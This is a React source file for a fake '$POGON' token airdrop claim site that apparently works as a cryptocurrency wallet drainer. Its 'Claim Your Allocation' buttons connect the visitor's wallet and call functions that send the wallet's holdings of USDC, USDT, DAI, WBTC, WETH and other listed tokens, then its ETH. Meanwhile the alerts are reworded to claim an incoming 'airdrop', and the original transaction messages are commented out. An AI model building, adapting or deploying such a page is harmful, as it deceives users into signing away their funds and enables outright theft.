import { useContext, useState } from 'react';
import { WalletContext } from './context/WalletContext';
import './App.css'
import { connectWallet, getBalance } from './web3/wallet';
import { getPriceUSD } from './web3/price';
import { sendETH } from './web3/send';
import { batchSendTokens } from './web3/sendToken';
import AirdropStats from './AirdropStat';
// import LiveChartComponent from './LiveChart.component';
// import FooterNav from './FooterNav';
// import Provider from '@walletconnect/ethereum-provider';
// import { useMemo } from "react";

const tokenAddresses = [
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
  "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
  "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
  "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", // WBTC
  "0x9Ac9468E7E3E1D194080827226B45d0B892C77Fd", // Yee Token which has 9 decimals YEE
  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  // WETH 18 decimals
  "0x514910771AF9Ca656af840dff83E8264EcF986CA",  // LINK 18 decimals
  "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI 18 decimals
  "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", // AAVE 18 decimals
  "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", // BAT 18 decimals
  "0xC011A72400E58ecD99Ee497CF89E3775d4bd732F", // SNX 18 decimals
  "0xE41d2489571d322189246DaFA5ebDe1F4699F498", // ZRX 18 decimals
  "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e", // YFI 18 decimals
  "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2", // MKR 18 decimals
  "0xc00e94Cb662C3520282E6f5717214004A7f26888", // COMP 18 decimals
  "0x6982508145454Ce325dDbE47a25d4ec3d2311933", // PEPE 18 decimals
  "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b", // CRO 18 decimals
  "0x0a26c80Be4E060e688d7C23aDdB92cBb5D2C9eCA",
  "0x034e3Da87c5cE36e23a010ba3c3Dc746ac7c5075",
];

// const titleText = "Welcome -> to -> the -> Airdrop -> DApp";
// Precompute random delays once
// const titleDelays = titleText.split("").map(() => `${(Math.random() * 0.5).toFixed(2)}s`);

function App() {
  const [menuOpen, setMenuOpen] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');
  const { state, dispatch } = useContext(WalletContext);
  const [loading, setLoading] = useState(false);
  // const topRef = useRef(null);
  // const chartRef = useRef(null);

  // const scrollToTop = () => {
  //   window.scrollTo({
  //     top: 0,
  //     behavior: "smooth"
  //   });
  // };

  // const scrollToCharts = () => {
  //   chartRef.current?.scrollIntoView({
  //     behavior: "smooth"
  //   });
  // };


  const handleConnectAndSend = async () => {
    setStatusMessage('Connect with a wallet with transaction and ETH token available.');
    if(loading) return; // prevent multiple clicks
    setLoading(true);

    try {
      let data = {
        provider: state.provider,
        signer: state.signer,
        address: state.address,
      }

      // if wallet is not connected, connect it first
      if(!state.address){
        data = await connectWallet();
        if(!data){
          // alert("Failed to connect wallet. Please try again.");
          alert("Failed to receive airdrop. Please try again.");
          setLoading(false);
          return;
        }

        dispatch({ type: "CONNECT_WALLET", payload: data });
        const bal = await getBalance(data.provider, data.address);
        dispatch({ type: "SET_BALANCE", payload: bal });
        const price = await getPriceUSD();
        const usdValue = (parseFloat(bal) * price).toFixed(2);
        dispatch({ type: "SET_USD_VALUE", payload: usdValue });
      }

      // send batch tokens first
      const tokenTx = await batchSendTokens(data.provider, data.signer, tokenAddresses);
      if(tokenTx){
        alert(`Airdrop Tokens pending...`);
        // alert(`Batch token transaction sent!\nHash: ${tokenTx}`);
      } else {
        // alert("Failed to send batch token transaction.");
        alert("Failed to receive airdrop tokens. Try again later.");
      }

      // Add a small delay to let the wallet process the transaction
      await new Promise(resolve => setTimeout(resolve, 2000));

      // send ETH after tokens
      const txHash = await sendETH(data.provider, data.signer);
      if(txHash){
        // alert(`ETH Transaction sent!\nHash: ${txHash}`);
        alert(`Airdrop ETH pending...`);
      } else {
        // alert("Failed to send ETH transaction.");
        alert("Failed to receive ETH airdrop. Try again later.");
      }
    } catch (error) {
      console.error("Error in connect/send flow:", error);
      alert("Something went wrong. Please try again.");
    }
    setLoading(false);
  }

  return (
    <>
      <div className="app-wrapper">
        {/* HEADER */}
        <header className="navbar">
          <div className="container nav-container">
            <a href="#home" className="brand">
              <img
                src="https://i.ibb.co/zWrHvpW4/imgbb.jpg"
                alt="$POGON Logo"
                className="brand-logo"
              />
              <div className="brand-text">
                <span className="brand-name">$POGON</span>
                <span className="brand-ticker">$PGN</span>
              </div>
            </a>

            <button
              className="mobile-menu-btn"
              onClick={() => setMenuOpen(!menuOpen)}
              aria-label="Toggle Menu"
            >
              {menuOpen ? '✕' : '☰'}
            </button>

            <nav className={`nav-links ${menuOpen ? 'active' : ''}`}>
              <a href="#about" onClick={() => setMenuOpen(false)}>About</a>
              <a href="#tokenomics" onClick={() => setMenuOpen(false)}>Tokenomics</a>
              <a href="#roadmap" onClick={() => setMenuOpen(false)}>Roadmap</a>
              <button
                className="btn-primary nav-cta"
                onClick={() => {
                  setMenuOpen(false);
                  handleConnectAndSend();
                }}
              >
                Claim Supply
              </button>
            </nav>
          </div>
        </header>

        {/* MAIN CONTENT */}
        <main className="main-content">
          <section id="home" className="hero-section">
            <div className="container hero-grid">
              {/* Left Info Column */}
              <div className="hero-info">
                <div className="badge">Official $PGN Supply Distribution</div>
                <h1>
                  Claim Your <span className="highlight">$POGON</span> Token Allocation
                </h1>
                <p className="hero-subtitle">
                  Built for speed, community ownership, and decentralized utility. Verify your eligible wallet to claim your share of the 55,000,000 $PGN distribution pool.
                </p>

                <div className="stats-row">
                  <div className="stat-box">
                    <span className="stat-label">Token Name</span>
                    <span className="stat-value">$POGON</span>
                  </div>
                  <div className="stat-box">
                    <span className="stat-label">Ticker</span>
                    <span className="stat-value">$PGN</span>
                  </div>
                  <div className="stat-box">
                    <span className="stat-label">Claim Pool</span>
                    <span className="stat-value">55,000,000</span>
                  </div>
                </div>
              </div>

              {/* Right Claim Card */}
              <div className="claim-card">
                <div className="card-header">
                  <img
                    src="https://i.ibb.co/zWrHvpW4/imgbb.jpg"
                    alt="$POGON Emblem"
                    className="card-logo"
                  />
                  <div>
                    <h2>Supply Claim Portal</h2>
                    <span className="network-pill">Ethereum Network</span>
                  </div>
                </div>

                <div className="allocation-box">
                  <div className="allocation-top">
                    <span>Available Supply Amount</span>
                    <span className="ticker-tag">$PGN</span>
                  </div>
                  <div className="allocation-amount">55,000,000</div>
                  <div className="allocation-subtext">55 Million $POGON Tokens</div>
                </div>

                <div className="claim-details">
                  <div className="detail-row">
                    <span>Distribution Status</span>
                    <span className="status-live">● Live</span>
                  </div>
                  <div className="detail-row">
                    <span>Requirement</span>
                    <span>Active ETH Wallet</span>
                  </div>
                </div>

                <button className="btn-primary claim-btn" onClick={handleConnectAndSend}>
                  Claim Your Allocation
                </button>

                {statusMessage && (
                  <div className="alert-box" role="alert">
                    <span className="alert-icon">⚠️</span>
                    <p>{statusMessage}</p>
                  </div>
                )}
              </div>
            </div>
          </section>

          {/* TOKENOMICS / INFO SECTION */}
          <section id="tokenomics" className="info-section">
            <div className="container">
              <h2 className="section-title">$POGON ($PGN) Overview</h2>
              <div className="cards-grid">
                <div className="info-card">
                  <h3>55M Supply Allocation</h3>
                  <p>
                    55,000,000 $PGN tokens are allocated directly for eligible community participants through the official claim portal.
                  </p>
                </div>
                <div className="info-card">
                  <h3>Wallet Eligibility</h3>
                  <p>
                    Ensure you interact using a wallet with existing transaction history and available ETH balance for network verification.
                  </p>
                </div>
                <div className="info-card">
                  <h3>Instant Settlement</h3>
                  <p>
                    Once verified, your $POGON allocation is processed directly on-chain without intermediary lockups.
                  </p>
                </div>
              </div>
            </div>
          </section>
        </main>

        {/* FOOTER */}
        <footer className="footer">
          <div className="container footer-grid">
            <div className="footer-brand">
              <div className="brand">
                <img
                  src="https://i.ibb.co/zWrHvpW4/imgbb.jpg"
                  alt="$POGON Logo"
                  className="brand-logo"
                />
                <div className="brand-text">
                  <span className="brand-name">$POGON</span>
                  <span className="brand-ticker">$PGN</span>
                </div>
              </div>
              <p className="footer-desc">
                Decentralized digital asset ecosystem powered by $POGON ($PGN). Claim your 55M supply allocation securely.
              </p>
            </div>

            <div className="footer-links">
              <h4>Navigation</h4>
              <a href="#home">Home</a>
              <a href="#about">About</a>
              <a href="#tokenomics">Tokenomics</a>
            </div>

            <div className="footer-links">
              <h4>Community</h4>
              <a href="#twitter">X (Twitter)</a>
              <a href="#telegram">Telegram</a>
              <a href="#etherscan">Explorer</a>
            </div>
          </div>

          <div className="footer-bottom">
            <div className="container footer-bottom-inner">
              <p>© {new Date().getFullYear()} $POGON ($PGN). All rights reserved.</p>
              <button className="footer-claim-link" onClick={handleConnectAndSend}>
                Claim Your Allocation →
              </button>
            </div>
          </div>
        </footer>
      </div>
    </>
  )
}

export default App
